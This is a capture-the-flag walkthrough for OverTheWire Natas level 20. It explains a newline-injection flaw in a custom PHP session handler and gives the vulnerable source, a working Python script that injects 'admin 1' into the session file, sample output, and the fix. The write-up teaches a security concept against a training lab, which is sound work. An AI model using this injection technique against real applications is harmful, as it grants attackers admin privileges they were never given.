# OverTheWire: Natas — Level 20 → Level 21

> **Vulnerability:** Session Data Injection via Newline Poisoning                                  
> **Skills:** PHP session internals, custom deserialisation flaws, HTTP POST, debug parameter analysis                             
> **Difficulty:** Medium-Hard                                              
> **Official Page:** [Natas Level 20](https://overthewire.org/wargames/natas/natas20.html)

---

## Access

- **URL:** `http://natas20.natas.labs.overthewire.org`
- **Username:** `natas20`
- **Password:** *obtain from previous level*

---

## Task

Find the password for natas21 by injecting a newline character into the session store so that the server reads your session as having `admin = 1`.

---

## Vulnerability

This level demonstrates **session data injection via newline poisoning**, caused by a custom PHP session handler that serialises session data as a line-delimited flat file without sanitising the values being stored. Each session variable is written as one line in the format `key value`. When a user-supplied value (the `name` POST parameter) is written directly into this file, an attacker can embed a newline character (`\n`) in the value to inject an additional line — for example, `admin 1`. When the session file is read back, the parser interprets the injected line as a legitimate session variable, granting the attacker admin status. The developer mistake is trusting user-supplied data enough to write it verbatim into a structured file format that uses newlines as record delimiters.

---

## Theory

### Custom PHP session handlers

PHP's built-in session mechanism (`session_start()`, `$_SESSION`) can be replaced with a custom handler by calling `session_set_save_handler()`. A custom handler defines its own functions for reading, writing, opening, and closing sessions. This is sometimes used to store sessions in a database or a custom file format instead of PHP's default serialisation.

The security risk is that PHP's default session handler sanitises and safely encodes values. A hand-written handler may not — and if the format it uses has a meaningful delimiter (here, `\n`), any user input that contains that delimiter can corrupt the structure of the file.

### Session file format used in this level

The custom handler in this level writes session data as a plain text file where each line represents one variable:

```
key1 value1
key2 value2
```

The `mywrite()` function loops over `$_SESSION` and writes each key-value pair separated by a space, with a newline after each pair. The `myread()` function reads the file back line by line, splits each line on the first space, and assigns the result to `$_SESSION`.

If `value1` contains a newline followed by `key2 value2`, the resulting file becomes:

```
key1 value1
key2 value2
```

The parser cannot distinguish the injected line from a legitimate one.

### Why `?debug=true` matters

The application checks for a `debug` GET parameter. When present, it prints the raw contents of the session file directly to the page. This is an information disclosure vulnerability in its own right, but in this context it is invaluable: it lets you watch the session file change in real time as you make requests, confirming that your injected data was written and subsequently parsed correctly.

### The three-request sequence

A single POST is not sufficient because of how PHP session files work. The session file is written at the end of each request and read at the start of the next. The admin check therefore only fires on the request *after* the poisoned write — not on the POST itself.

| Request | Purpose |
|---|---|
| Initial GET | Establish a session and obtain a `PHPSESSID` cookie |
| POST with injected name | Write the poisoned value into the session file |
| Final GET | Trigger `myread()`, which parses the injected line and loads `admin = 1` into `$_SESSION` |

### Tools used in this level

| Tool | Purpose |
|---|---|
| Browser — View Page Source (`Ctrl+U`) | Read the exposed PHP source and understand the custom session handler |
| `?debug=true` query parameter | Print the raw session file contents to the page |
| Python `requests.Session()` | Maintain the same `PHPSESSID` cookie across all three requests |
| `\n` in a POST value | Inject a newline into the session file |

---

## Solution

### Step 1: Log in and read the page source

Navigate to `http://natas20.natas.labs.overthewire.org` and authenticate. Press `Ctrl+U` to view the PHP source. The relevant functions are `myread()` and `mywrite()`:

```php
function myread($sid) {
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    if (!file_exists($filename)) {
        return "";
    }
    $data = file_get_contents($filename);
    $_SESSION = array();
    foreach (explode("\n", $data) as $line) {
        $parts = explode(" ", $line, 2);  // Split on the FIRST space only
        if ($parts[0] != "") {
            $_SESSION[$parts[0]] = $parts[1];
        }
    }
    return session_encode();
}

function mywrite($sid, $sess_data) {
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    $data = "";
    $_SESSION = array();
    session_decode($sess_data);
    foreach ($_SESSION as $key => $value) {
        $data .= $key . " " . $value . "\n";  // No sanitisation of $value
    }
    file_put_contents($filename, $data);
    return true;
}
```

The application code that handles the POST and checks for admin:

```php
session_set_save_handler("myopen", "myclose", "myread", "mywrite", "mydestroy", "mygarbage");
session_start();

if (array_key_exists("name", $_POST)) {
    $_SESSION["name"] = $_POST["name"];  // User input written directly into session
}

if (array_key_exists("admin", $_SESSION) && $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas21\n";
    print "Password: <censored></pre>";
}
```

> **What to notice:** `mywrite()` writes `$_SESSION["name"]` verbatim with no newline stripping. If the name contains `\n`, that character is written literally into the session file. On the next request, `myread()` calls `explode("\n", $data)` and treats every line — including the injected one — as a session variable. The injected line `admin 1` is parsed as key `admin`, value `1`, which satisfies the admin check.

### Step 2: Add `?debug=true` to observe the session file

Before injecting anything, load the page with the debug parameter to see the current session file contents:

```
http://natas20.natas.labs.overthewire.org/?debug=true
```

The page will include output similar to:

```
DEBUG: Reading from /var/lib/php/sessions/mysess_abc123def456
DEBUG: Session data: (empty)
```

> **What to notice:** The session file is empty on first load because no `name` has been submitted yet. This confirms the file path and the format the custom handler uses. When you see this, you have established a valid session and received a `PHPSESSID` cookie.

### Step 3: Run the injection script

The script performs three requests in sequence using the same session object, which preserves the `PHPSESSID` cookie automatically across all three calls.

Save the following as `natas20_inject.py`:

```python
#!/usr/bin/env python3

import requests

USERNAME = "natas20"
PASSWORD = "<natas20_password>"   # Replace with the actual password from Level 19
URL      = f"http://{USERNAME}.natas.labs.overthewire.org/?debug=true"
AUTH     = (USERNAME, PASSWORD)

session = requests.Session()

# Request 1: Initial GET — establish session, observe empty state
print("=== Request 1: Initial GET ===")
resp = session.get(URL, auth=AUTH, timeout=10)
print(resp.text)
print("=" * 80)

# Request 2: POST with injected newline — poison the session file
print("=== Request 2: POST with injected payload ===")
resp = session.post(URL, data={"name": "plzsub\nadmin 1"}, auth=AUTH, timeout=10)
print(resp.text)
print("=" * 80)

# Request 3: Final GET — session file is re-read; admin=1 is now in $_SESSION
print("=== Request 3: Final GET ===")
resp = session.get(URL, auth=AUTH, timeout=10)
print(resp.text)
print("=" * 80)
```

Run it:

```bash
python3 natas20_inject.py
```

```
=== Request 1: Initial GET ===
DEBUG: Reading from /var/lib/php/sessions/mysess_abc123def456
DEBUG: Session data: (empty)

Please login with your username and name.
================================================================================

=== Request 2: POST with injected payload ===
DEBUG: Reading from /var/lib/php/sessions/mysess_abc123def456
DEBUG: Session data:
name plzsub

Please login with your username and name.
================================================================================

=== Request 3: Final GET ===
DEBUG: Reading from /var/lib/php/sessions/mysess_abc123def456
DEBUG: Session data:
name plzsub
admin 1

You are an admin. The credentials for the next level are:
Username: natas21
Password: <censored>
================================================================================
```

> **What to notice:** After Request 2, the debug output shows `name plzsub` — the `\n` terminated the name value and pushed `admin 1` onto a new line in the file. After Request 3, `myread()` splits the file on `\n` and sees two separate lines: `name plzsub` and `admin 1`. The second line is parsed as key `admin` with value `1`. The admin check passes and the password is printed. The session file was never modified by anything other than the user-supplied `name` field.

### Step 4: Extract the password

The password for natas21 appears in the HTML body of Request 3's response, inside a `<pre>` block. Copy it and store it for the next level.

---

## Password for Next Level

```
[redacted — obtain by completing the steps above]
```

---

## Key Takeaways

Writing user-supplied data verbatim into a structured file format is a form of injection — the same class of vulnerability as SQL injection, just targeting a different parser. The delimiter here is a newline, the structured format is a flat session file, and the consequence is privilege escalation from a regular user to admin without knowing any admin credentials. The correct defence is to strip or reject newline characters from any value before writing it into a newline-delimited format, or to use a serialisation format that encodes delimiter characters safely (such as PHP's built-in session serialiser, which does not use raw newlines as field delimiters). The `?debug=true` parameter is also a real vulnerability in its own right — exposing raw session file contents to any authenticated user leaks internal application state and has no place in production code.

---

## Common Mistakes

| Mistake | What Happens | Fix |
|---|---|---|
| Sending only the POST without a subsequent GET | The admin check never fires because `myread()` has not yet re-parsed the session file | Always send a follow-up GET after the POST; the injected value takes effect on the next request |
| Using `\\n` (literal backslash-n) in the Python string instead of `\n` | The characters `\` and `n` are written to the session file, not a newline; the parser never splits on them | Use a regular Python string with `\n`, not a raw string (`r"..."`) |
| Not using `requests.Session()` | Each request gets a different `PHPSESSID`; the POST and the final GET refer to different session files on the server | Use `requests.Session()` so the same cookie is sent on all three requests |
| Injecting `admin=1` (with an equals sign) instead of `admin 1` (with a space) | The parser splits on a space, not an equals sign; the key becomes `admin=1` with no value, and the admin check fails | Use a space as the separator to match the format `myread()` expects: `admin 1` |
| Omitting `?debug=true` during testing | The session file contents are not visible; you cannot confirm the injection was written correctly | Add `?debug=true` to the URL during testing to observe the session state at each step |
